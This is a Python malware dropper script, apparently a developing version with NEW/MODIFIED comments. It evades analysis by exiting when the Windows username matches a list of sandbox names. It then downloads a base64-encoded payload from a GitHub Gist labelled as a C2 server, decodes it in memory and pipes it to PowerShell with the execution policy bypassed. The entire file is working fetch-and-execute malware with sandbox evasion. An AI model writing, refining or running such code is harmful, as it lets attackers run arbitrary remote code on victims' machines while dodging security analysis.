# dropper_final.py

import requests
import subprocess
import base64
import os      # --- NEW ---: To get environment variables like username.
import sys     # --- NEW ---: To exit the script cleanly.

# --- CONFIGURATION ---
C2_URL = "https://gist.githubusercontent.com/nithiya-rajesh/5199a6d6caa9a7d6b501cc0f7a97117a/raw/c62ed6b954bbd866e5ee014ba3c4f1f54b08d190/payload.b64" # Use the same B64 Gist URL

# --- NEW ---
# A list of common sandbox/analysis usernames.
SANDBOX_USERNAMES = ["user", "test", "sandbox", "admin", "administrator"]

def is_sandboxed():
    """
    Performs a simple check to see if the script is running in a sandbox.
    Returns True if a sandbox is detected, False otherwise.
    """
    print("[*] Performing sandbox checks...")
    try:
        # The 'USERNAME' environment variable is common on Windows.
        username = os.getenv("USERNAME", "").lower()
        if username in SANDBOX_USERNAMES:
            print(f"[!] Sandbox detected! Username '{username}' is on the blacklist. Aborting.")
            return True
    except Exception as e:
        # If we can't even get the username, something is weird. Be safe.
        print(f"[!] An error occurred during sandbox check: {e}")
        return True
        
    print("[+] No obvious sandbox detected.")
    return False

def get_obfuscated_payload():
    """Downloads the obfuscated payload from the C2 server."""
    try:
        print(f"[*] Downloading obfuscated payload from {C2_URL}...")
        response = requests.get(C2_URL)
        response.raise_for_status()
        return response.text.strip()
    except requests.exceptions.RequestException as e:
        print(f"[!] Error downloading payload: {e}")
        return None

def execute_payload_in_memory(encoded_payload):
    """Decodes and executes the payload directly in memory."""
    try:
        print("[*] Decoding payload in memory...")
        decoded_bytes = base64.b64decode(encoded_payload)
        decoded_command = decoded_bytes.decode('utf-8')

        print("[*] Executing payload from memory...")
        subprocess.run(
            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", "-"],
            input=decoded_command,
            check=True,
            capture_output=True,
            text=True
        )
        print("[+] Payload executed successfully in memory.")
    except Exception as e:
        print(f"[!] An error occurred during payload execution: {e}")

def main():
    """Main orchestrator function."""
    # --- MODIFIED ---
    # The script will now exit if it detects a sandbox.
    if is_sandboxed():
        sys.exit(0) # Exit cleanly with status code 0.
        
    encoded_payload = get_obfuscated_payload()
    if encoded_payload:
        execute_payload_in_memory(encoded_payload)

if __name__ == "__main__":
    main()